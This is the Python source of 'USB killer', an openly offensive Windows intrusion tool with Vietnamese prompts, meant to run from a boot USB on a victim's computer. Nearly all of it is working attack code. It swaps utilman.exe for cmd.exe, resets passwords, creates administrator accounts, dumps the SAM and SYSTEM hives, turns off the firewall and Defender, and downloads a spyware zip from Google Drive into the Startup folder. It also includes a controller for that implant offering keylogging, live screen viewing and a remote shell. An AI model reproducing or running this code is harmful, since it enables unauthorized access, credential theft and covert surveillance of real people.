import colorama
colorama.init(autoreset=True)
print(colorama.Fore.CYAN + "Đang khởi động tool, vui lòng chờ...")
import os
import shutil
import requests
import socket
from zlib import decompress
import threading
import zipfile
os.system('cls')
version = 1
def logo():
    print(colorama.Fore.LIGHTYELLOW_EX + r'''
      |\/\/\/\/\/|
      |          |
      |          |
      |          |
      |    __  __|
      |   /  \/  \
      |  (o   )o  )
     /c   \__/ --.    Hi,Im Bart!Are u ready to hack?
     \_   ,     -'
      |  '\_______)
      |      _)
      |     |
     /`-----'\
    /         \

    ██    ██ ███████ ██████      ██   ██ ██ ██      ██      ███████ ██████  
    ██    ██ ██      ██   ██     ██  ██  ██ ██      ██      ██      ██   ██ 
    ██    ██ ███████ ██████      █████   ██ ██      ██      █████   ██████  
    ██    ██      ██ ██   ██     ██  ██  ██ ██      ██      ██      ██   ██ 
     ██████  ███████ ██████      ██   ██ ██ ███████ ███████ ███████ ██   ██ 

Chào mừng đến với USB killer tool
Tác giả: Phan Huỳnh Thiên Phú''')


logo()


def get_system_drive():
    system_root = os.environ.get('SystemRoot')
    drive = system_root.split('\\')[0] + '\\'
    return drive


C = get_system_drive()[0]


def scan_spy():
    print(colorama.Fore.YELLOW + 'Scan Spy chỉ hoạt động trong mạng nội bộ (chung wifi)\n'
                                 'Scan spy chỉ hoạt động khi nạn nhân đang sử dụng máy tính\n'
                                 'Scan spy không tìm thấy spy khi nạn nhân đã tắt máy\n'
                                 'Scan spy có thể không tìm thấy vì spy đã bị tiêu diệt')
    ip_list = []

    def scan_ip(ip):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect((ip, 1006))
            ip_list.append(ip)
        except:
            pass

    local_ip = input(colorama.Fore.CYAN + 'Nhập địa chỉ IP router wifi: ')
    print(colorama.Fore.CYAN + 'Đang quét dãy IP từ 1-255')
    for i in range(1, 256):
        ip = f"{local_ip[:-2]}.{i}"
        t = threading.Thread(target=lambda: scan_ip(ip))
        t.start()
    if not ip_list:
        print(colorama.Fore.RED + 'Không tìm thấy IP spy đang hoạt động')
    else:
        for spyS in ip_list:
            print(colorama.Fore.CYAN + f'{spyS} đang hoạt động')


def view_spy():
    print(colorama.Fore.YELLOW + 'Lệnh này dùng để gọi gián điệp đã tiêm trên máy nạn nhân\n'
                                 'Lưu ý để sử dụng được lệnh này cần chạy lệnh /spy trên máy nạn nhân\n')
    ip = input(colorama.Fore.CYAN + 'Vui lòng nhập local ip nạn nhân: ')
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, 1006))
            print(colorama.Fore.CYAN + 'Kết nối thành công...')

            def recvall(conn, length):
                buf = b''
                while len(buf) < length:
                    data = conn.recv(length - len(buf))
                    if not data:
                        return data
                    buf += data
                return buf

            def screen():
                import pygame
                pygame.init()
                screen = pygame.display.set_mode((1920, 1080))
                clock = pygame.time.Clock()
                watching = True
                try:
                    while watching:
                        for event in pygame.event.get():
                            if event.type == pygame.QUIT:
                                watching = False
                                break
                        size_len = int.from_bytes(sock.recv(1), byteorder='big')
                        size = int.from_bytes(sock.recv(size_len), byteorder='big')
                        pixels = decompress(recvall(sock, size))
                        img = pygame.image.fromstring(pixels, (1920, 1080), 'RGB')
                        screen.blit(img, (0, 0))
                        pygame.display.flip()
                        clock.tick(60)

                finally:
                    sock.close()

            def key_logger():
                print(colorama.Fore.LIGHTCYAN_EX + 'Đang nghe lén...')
                while True:
                    data = sock.recv(1024).decode('utf-8')
                    if 'Key' in data:
                        print(f'{colorama.Fore.MAGENTA}{data}', end='', flush=True)
                    else:
                        print(f'{colorama.Fore.CYAN}{data}', end='', flush=True)

            def shells():
                print(colorama.Fore.LIGHTCYAN_EX + 'Đang chiếm Terminal...')
                while True:
                    os_cw = sock.recv(1024).decode('utf-8')
                    command_shell = input(colorama.Fore.CYAN + f'{os_cw}>')
                    if command_shell == '/quitshell':
                        sock.send(command_shell.encode('utf-8'))
                        break
                    else:
                        sock.send(command_shell.encode('utf-8'))
                        cd_current = sock.recv(1024).decode('utf-8')
                        if cd_current == 'Lệnh Thất Bại':
                            print(colorama.Fore.RED + 'Lệnh Thất Bại')
                        else:
                            print(colorama.Fore.CYAN + f'{cd_current}')

            def spyhelp():
                print(f'{colorama.Fore.LIGHTCYAN_EX}Hakcking:\n'
                      f'/keylogger : xem tất cả những gì nạn nhân đang gõ ( trực tiếp )\n'
                      f'/shell : chiếm quyền sử dụng CMD máy nạn nhân\n'
                      f'/screen : xem màn hình nạn nhân( trực tiếp )\n'
                      f'-------------------------------------------------------------------\n'
                      f'Non-hacking:\n'
                      f'/spyhelp : xem tất cả lệnh của Spy\n'
                      f'/spyreadme : đọc thông tin về Spy\n'
                      f'/killspy : để xóa Spy vĩnh viễn trên máy nạn nhân\n'
                      f'/quitspy : để thoát Spy, trở về usb killer')

            def spy_read_me():
                print(colorama.Fore.YELLOW + '/viewspy là một trong những lệnh của tool usb_killer\n'
                                             'Trong /viewspy có những lệnh con,nhập /spyhelp để đọc tất cả lệnh con\n'
                                             'Spy có thể bypass windown defender (90%)\n'
                                             'Spy có thề bị các phần mềm anti virus diệt\n'
                                             'Cách thức hoạt động của Spy:\n'
                                             '1 : Tiêm Spy vào thư mục startup , khi windown khởi động Spy cũng thức tỉnh theo\n'
                                             '2 : Khi thức tỉnh Spy sẽ mở port cho các hacker(bạn),kết nối với máy bị nhiễm\n'
                                             '3 : Bạn là hacker, chạy lệnh /viewspy trên máy bạn và kết nối với máy nhiễm Spy\n'
                                             'Các chức năng của Spy:\n'
                                             '1 : Chiếm quyền sử dụng CMD\n'
                                             '2 : Nghe lén và trả về những gì nạn nhân đang nhập trên bàn phím\n'
                                             '3 : Xem nạn nhân đang làm gì(hack xem màn hình)')

            command = input(colorama.Fore.CYAN + 'Spy> ')
            if command == '/keylogger':
                sock.send('/keylogger'.encode('utf-8'))
                key_logger()
            elif command == '/shell':
                sock.send('/shell'.encode('utf-8'))
                shells()
            elif command == '/screen':
                sock.send('/screen'.encode('utf-8'))
                print(colorama.Fore.CYAN + 'Thành công! Gián điệp đang quay lén màn hình')
                screen()
            elif command == '/killspy':
                sock.send('/killspy'.encode('utf-8'))
            elif command == '/spyhelp':
                spyhelp()
            elif command == '/spyreadme':
                spy_read_me()
            elif command == '/quitspy':
                break

            else:
                print(colorama.Fore.RED + f'Không có lệnh {command} vui lòng để gõ /spyhelp để xem tất cả lệnh')
        except:
            print('')
            print(colorama.Fore.RED + 'Lỗi\n'
                                      '1: Có thể bạn đã nhập sai ip máy nạn nhân\n'
                                      '2: Có thể nạn nhân chưa khởi động máy\n'
                                      '3: Có thể nạn nhân đã tắt máy')
            break


def check_update():
    print(colorama.Fore.CYAN + 'Đang kiểm tra phiên bản...')
    try:
        data = requests.get('https://thienphu123.pythonanywhere.com/usb').json()
        if data['version'] == version:
            print(colorama.Fore.CYAN + 'Bạn đang ở phiên bản mới nhất ')
        else:
            print(colorama.Fore.CYAN + f'Đã có phiên bản mới {data['version']}\n'
                                       f'Bạn có muốn update lên phiên bản mới nhất không?')
            answe = input(colorama.Fore.CYAN + 'Nhập lựa chọn (yes/no): ').lower()
            if answe == 'yes':
                print(colorama.Fore.CYAN + 'Đang tiến hành update, vui lòng chờ ...')
                rq2 = requests.get(data['link'])
                file = open('usb_killer.exe', 'wb')
                file.write(rq2.content)
                file.close()
                print(colorama.Fore.CYAN + 'Update hoành tất\n'
                                           'Đang tắt tool')



            elif answe == 'no':
                print(colorama.Fore.CYAN + f'Đã chặn update, tiếp tục sử dụng phiên bản {version}')
            else:
                print(colorama.Fore.CYAN + 'Nhập sai lựa chọn')
    except:
        print(colorama.Fore.RED + 'Lỗi kết nối Internet')


def spy():
    print(colorama.Fore.YELLOW + 'Lệnh này yêu cầu máy nạn nhân có kết nối mạng\n'
                                 'Sau khi tiêm máy nạn nhân cần khởi động lại\n'
                                 'Chạy lệnh /offwdf để tắt vô hiệu windown defender start up\n'
                                 'Việc tiêm Spy này chỉ cần thực hiện 1 lần\n'
                                 'Khả năng thành công khoản 70% vì khi tiêm dễ bị các phần mềm diệt virus xóa')
    try:
        rq = requests.get(
            'https://drive.usercontent.google.com/download?id=1hcZByd4GPitzWgS3_wThD5uZtWubFmAD&export=download&authuser=0&confirm=t&uuid=87a7b255-a17e-4905-9802-7bf6e11cf0c8&at=AO7h07dsvwobjDQbOMbOKb-lyEjz%3A1724978233817')
        user = input(f'{colorama.Fore.CYAN}Nhập User Windown nạn nhân: ')
        datapath2 = f'{C}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        print(colorama.Fore.CYAN + 'kết nối đã ổn định\n'
                                   'Đang bắt đầu tiêm virus gián điệp\n'
                                   'Vui lòng chờ ...')

        file = open(f'{datapath2}\\keyss.zip', 'wb')
        file.write(rq.content)
        file.close()
        with zipfile.ZipFile(f'{datapath2}\\keyss.zip', 'r') as zip_ref:
            zip_ref.extractall(path=f'{datapath2}', pwd="Thienphu1006@".encode('utf-8'))
        os.remove(f'{datapath2}\\keyss.zip')
        print(colorama.Fore.CYAN + 'Đã tiêm thành công, nạn nhân cần khởi động lại và sử dụng')
    except:
        print(colorama.Fore.RED + 'Lỗi kết nối internet, vui lòng thử lại sau')


def firewall():
    os.system('netsh advfirewall set publicprofile state off')
    os.system('netsh advfirewall set domainprofile state off')
    os.system('netsh advfirewall set privateprofile state off')


def covid():
    print(
        colorama.Fore.YELLOW + 'Nhập số lượng virus muốn spam hoặc nhập /loop để spam virus vô hạn cho đến khi dừng tool')
    c = input(colorama.Fore.CYAN + 'Nhập đường dẫn muốn spam virus : ')
    soluong = input(colorama.Fore.CYAN + 'Nhập số lượng virus : ')
    soluong_virues = 0
    if soluong == '/loop':
        while True:
            file = open(f'{c}:\\virus-{str(soluong_virues)}.txt', 'a', encoding='utf-8')
            file.write('Your pc got covid virues\n'
                       'PC của bạn đã nhiễm virus covid')
            file.close()
            print(colorama.Fore.LIGHTCYAN_EX + f'Đã tạo thành công virus {str(soluong_virues)}')
            soluong_virues += 1
    else:
        for i in range(soluong_virues, int(soluong) + 1):
            file = open(f'{c}:\\virus-{str(i)}.txt', 'a', encoding='utf-8')
            file.write('Your pc got covid virues\n'
                       'PC của bạn đã nhiễm virus covid')
            file.close()
            print(colorama.Fore.LIGHTCYAN_EX + f'Đã tạo thành công virus {str(i)}')
        print(colorama.Fore.CYAN + f'Đã tạo thành công {soluong} virues')


def file_upload():
    print(colorama.Fore.YELLOW + 'Lệnh upload file tới thư mục start up\n'
                                 'Có thể up file ảnh, âm thanh, exe, virus\n'
                                 'Khi nạn nhân mở máy file bạn up cũng sẽ chạy theo\n'
                                 'Nhớ chạy lệnh /offwdf để tắt windown defender trước')
    user = input(colorama.Fore.CYAN + 'Nhập tên user: ')
    file_up = input(colorama.Fore.CYAN + 'Nhập tên file cần upload: ')
    winpath = f'{C}:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    try:
        read_file = open(file_up, 'rb')
        data = read_file.read()
        read_file.close()
        write_file = open(f'{winpath}\\{file_up}', 'wb')
        write_file.write(data)
        write_file.close()
        print(colorama.Fore.CYAN + f'Đã upload file {file_up} thành công')
    except:
        print(colorama.Fore.RED + f'Không tìm thấy {file_up}')


def renames():
    odia = input(colorama.Fore.CYAN + 'Nhập ổ đĩa chứa folder WINDOWS: ').upper()
    winpath = f'{odia}:\\WINDOWS\\System32'
    try:
        shutil.copy(f'{winpath}\\utilman.exe', f'{winpath}\\utilman1.exe')
        shutil.copy(f'{winpath}\\cmd.exe', f'{winpath}\\cmd1.exe')
    except:
        pass
    os.system(f'del {winpath}\\utilman.exe')
    os.rename(f'{winpath}\\cmd1.exe', f'{winpath}\\utilman.exe')
    print(colorama.Fore.CYAN + 'Done-đã mở được CMD full quyền')


def recover():
    winpath = f'{C}:\\WINDOWS\\System32'
    os.rename(f'{winpath}\\utilman.exe', f'{winpath}\\cmd1.exe')
    os.rename(f'{winpath}\\utilman1.exe', f'{winpath}\\utilman.exe')
    print(colorama.Fore.CYAN + 'Done-đã phục hồi CMD và Utilman')


def winrm():
    os.system('powershell -Command Set-NetConnectionProfile -NetworkCategory Private')
    os.system('powershell -Command winrm quickconfig')


def hackpassword():
    user = input(colorama.Fore.CYAN + 'Nhập tên user cần hack: ')
    passw = input(colorama.Fore.CYAN + 'Nhập password cần thay đổi: ')
    os.system(f'net user {user} {passw}')


def create_account():
    user = input(colorama.Fore.CYAN + 'Nhập tên user cần tạo: ')
    passw = input(colorama.Fore.CYAN + 'Nhập password: ')
    os.system(f'net user {user} {passw} /add')
    os.system(f'net localgroup Administrators {user} /add')


def delete_account():
    user = input(colorama.Fore.CYAN + 'Nhập tên user cần xóa: ')
    os.system(f'net user {user} /delete')


def sam_sys():
    print(colorama.Fore.YELLOW + 'Chỉ sử dụng được khi đã vào windonw')
    os.system('reg save HKLM\\SAM ./SAM.save')
    os.system('reg save HKLM\\SYSTEM ./SYSTEM.save')


def offwdf():
    try:
        for drives in os.listdrives():
            if drives == C:
                continue
            else:
                os.system(f'powershell -Command Add-MpPreference -ExclusionPath "{drives}"')

        os.system(f'powershell -Command Add-MpPreference -ExclusionPath "{C}:\\Users"')
        print(colorama.Fore.CYAN + 'By pass thành công ')
    except:
        print(colorama.Fore.RED + 'Thất bại')


def help():
    print(f'{colorama.Fore.LIGHTCYAN_EX}Hacking commands\n'
          'Nhập /cmdfake : để mở cmd full quyền\n'
          'Nhập /recover : để khôi phục utilman.exe \n'
          'Nhập /hackpassword : để đổi password windown\n'
          'Nhập /create : để tạo account\n'
          'Nhập /delete : để xóa account\n'
          'Nhập /winrm : để chạy windown remote\n'
          'Nhập /offwdf : để tắt windown defender\n'
          'Nhập /offfw : để tắt fire wall\n'
          'Nhập /samsys : để lấy file sam và system\n'
          'Nhập /sendmess : để gửi lại lời nhắn cho nạn nhân\n'
          'Nhập /upload : để upload file của bạn vào máy nạn nhân\n'
          'Nhập /spam : để spam file rác vào máy nạn nhân\n'
          'Nhập /spy : để tiêm gián điệp vào máy nạn nhân\n'
          'Nhập /scanspy : để quét những máy đã nhiễm spy đang hoạt động\n'
          'Nhập /viewspy : để chạy gián điệp đã cài trên máy nạn nhân\n'
          '-------------------------------------------------------------------\n'
          'Non-hacking commands\n'
          'Nhập /toolinfor : để xem thông tin của tool\n'
          'Nhập /help : để xem các lựa chọn có sẵn trong tool\n'
          'Nhập /update : để kiểm tra và cập nhật phiên bản mới nhất của tool\n'
          'Nhập /clear : để dọn dẹp những gì đã nhập \n'
          'Nhập /quit : để thoát tool')


def sendmess():
    print(colorama.Fore.YELLOW + 'Lệnh nảy giúp tạo một tin nhắn khi nạn nhân mở máy tính lên, họ sẽ đọc được\n'
                                 'Lưu ý: nên gửi tin nhắn bằng tiếng Anh')
    try:
        user = input(f'{colorama.Fore.CYAN}Nhập User Windown nạn nhân: ')
        datapath = f'{C}:\\Users\\{user}\\AppData\\Roaming'
        datapath2 = f'{datapath}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        title = input(colorama.Fore.CYAN + 'Nhập tiêu đề tin nhắn: ')
        mess = input(colorama.Fore.CYAN + 'Nhập tin nhắn muốn để lại cho nạn nhân: ')
        file = open(f'{datapath2}\\message.vbs', 'w', encoding='utf-8')
        file.write(f'x=msgbox("{mess}", 0, "{title}")')
        file.close()
        print(colorama.Fore.CYAN + 'Thành công!')
    except:
        print(colorama.Fore.RED + 'Thất bại, thử lại sau')


def appinfor():
    print(f'{colorama.Fore.LIGHTCYAN_EX}Thông tin :\n'
          'Tên tool : USB killer\n'
          'Ngôn Ngữ : Python\n'
          'Người tạo : Phan Huỳnh Thiên Phú\n'
          'Hoạt động : Win7,Win8,Win10,Win11\n'
          'Phiên bản : Tiếng Việt V2\n'
          'Cách thức hoạt động: Tải tool này copy vào một usb boot windown ,cắm vào máy nạn nhân và boot win, sau đó gọi tool để sữ dụng (có thể liên hệ hướng dẫn)\n'
          'Liên hệ FB : https://www.facebook.com/profile.php?id=100081986971909\n'
          f'{colorama.Fore.YELLOW}Màu Vàng : Thông báo hoặc hướng dẫn sài tool\n'
          f'{colorama.Fore.CYAN}Màu Xanh : Lệnh nhập hoặc thông báo cho ra kết quả thành công\n'
          f'{colorama.Fore.RED}Màu Đỏ : Kết quả thất bại hoặc lỗi')


while True:
    chosse = input(colorama.Fore.CYAN + 'USB killer> ')
    if chosse == '/cmdfake':
        renames()
    elif chosse == '/recover':
        recover()
    elif chosse == '/hackpassword':
        hackpassword()
    elif chosse == '/create':
        create_account()
    elif chosse == '/delete':
        delete_account()
    elif chosse == '/winrm':
        winrm()
    elif chosse == '/upload':
        file_upload()
    elif chosse == '/offwdf':
        offwdf()
    elif chosse == '/offfw':
        firewall()
    elif chosse == '/samsys':
        sam_sys()
    elif chosse == '/sendmess':
        sendmess()
    elif chosse == '/viewspy':
        view_spy()
    elif chosse == '/spy':
        spy()
    elif chosse == '/scanspy':
        scan_spy()
    elif chosse == '/spam':
        covid()
    elif chosse == '/update':
        check_update()
    elif chosse == '/toolinfor':
        appinfor()
    elif chosse == '/clear':
        os.system('cls')
        logo()
    elif chosse == '/quit':
        print(colorama.Fore.YELLOW + 'Cảm ơn đã sử dụng tools\n'
                                     'Thanks from Phan Huỳnh Thiên Phú ♥')
        break
    elif chosse == '/help':
        help()
    else:
        print(colorama.Fore.RED + f'Không có lệnh {chosse} vui lòng gõ /help')






